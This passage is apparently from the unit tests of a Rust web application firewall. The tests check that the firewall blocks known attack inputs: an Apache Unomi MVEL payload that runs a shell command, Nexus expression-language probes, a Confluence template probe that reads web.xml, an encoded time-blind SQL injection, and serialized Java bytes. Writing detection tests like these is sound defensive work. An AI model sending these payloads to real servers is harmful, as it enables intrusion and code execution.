        // (CVE-2020-10204 family), and the Confluence macro-preview
        // `_template` deployment-descriptor probe.
        for (name, body) in [
            (
                "unomi mvel separated exec",
                &b"{\"filters\":[{\"condition\":{\"parameterValues\":{\"\": \"script::Runtime r = Runtime.getRuntime(); r.exec(\\\"touch /tmp/mvel\\\");\"},\"type\":\"profilePropertyCondition\"}}]}"[..],
            ),
            (
                "nexus group EL probe",
                &b"{\"name\":\"internal\",\"group\":{\"memberNames\":[\"$\\\\A{233*233*233}\"]}}"[..],
            ),
            (
                "nexus extdirect EL probe",
                &b"{\"action\":\"coreui_User\",\"data\":[{\"roles\":[\"nxadmin$\\\\B{233*233}\"]}]}"[..],
            ),
            (
                "confluence _template probe",
                &b"{\"contentId\":\"786458\",\"macro\":{\"name\":\"widget\",\"params\":{\"_template\":\". /web.xml\"}}}"[..],
            ),
        ] {
            let v = strict_json(body);
            assert_eq!(v.action, WafAction::Block, "{name}: {}", v.details);
        }
    }

    #[test]
    fn noncanonical_b64_waitfor_onion_blocks() {
        // (`a2af` family): whole-value b64 transport with non-canonical
        // trailing bits — the backend's lenient decoder unwraps it while a
        // strict decoder refuses — over a second b64 layer carrying
        // `));wAITfor` time-blindness with comment filler (no `delay`, no
        // `(` after waitfor).
        let e = strict_engine();
        let v = e.inspect(&req(
            "HEAD",
            "/x",
            concat!(
                "analogy=S1NrN2QwRkpWR1p2Y2dvdktpQnBiblJsY25CdmJHRjBaV04xY25KbGJuUjBhVzFsZW05dVpXOXdkSE5tYjJOMWMyRmliR1Z2Y21SbGNtTnZiM0prYzNWdWMzVmljMk55YVdKbENuTmxjR0Z5WVhSdmNuTmxjM05wYjI1amJHOXpaWE4wYjNKa1pYSm",
                "llV0Z1YVcxaGRHVmtaMjl2WkFvS0",
            ),
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn java_serialized_magic_percent_query_blocks() {
        // (`70/62` family): raw Java ObjectStream bytes transported through a
        // percent-encoded query — the byte-restoring decoder surfaces them as
        // Latin-1 text, and the deser-shape layer must fire on the magic plus
        // the `sr` class-descriptor marker.
        let e = strict_engine();
        let v = e.inspect(&req(
            "GET",
            "/",
            concat!(
                "s=%ac%ed%00%05%73%72%00%1a%63%6f%6d%2e%63%74%2e%61%72%61%6c%65%69%69",
                "%2e%74%65%73%74%2e%50%65%72%73%6f%6e%78%70%00%00%00%01%00%62%65",
            ),
        ));
        assert_eq!(v.action, WafAction::Block, "details: {}", v.details);
    }

    #[test]
    fn stack_scoped_rules_respect_configured_stacks() {
        // A Java-scoped custom rule must be inactive for an engine built
        // without the Java stack, and active once it is configured.
        let make_rule = || {
            let mut r = CompiledRule::compile(
                "JAVA-ONLY",
                "java-scoped test rule",
                r#"user_agent contains "ozilla""#,
                RuleAction::Block,
                5,
                vec![],
            )
            .unwrap();
            r.stacks = StackSet::JAVA;
            r
        };
        let without_java = WafEngine::new(&WafEngineConfig {
            mode: WafMode::Monitor,
            stacks: StackSet::GENERIC,
            rules: vec![make_rule()],
            ..Default::default()
        });
        let v = without_java.inspect(&req("GET", "/", ""));
        assert!(
            !v.matched_rules.contains(&"JAVA-ONLY".to_string()),
            "java-scoped rule must be inactive without the java stack"
        );

        let with_java = WafEngine::new(&WafEngineConfig {
            mode: WafMode::Monitor,
            stacks: StackSet::GENERIC.union(StackSet::JAVA),
            rules: vec![make_rule()],
            ..Default::default()
        });
        let v = with_java.inspect(&req("GET", "/", ""));
        assert!(v.matched_rules.contains(&"JAVA-ONLY".to_string()));
    }
}
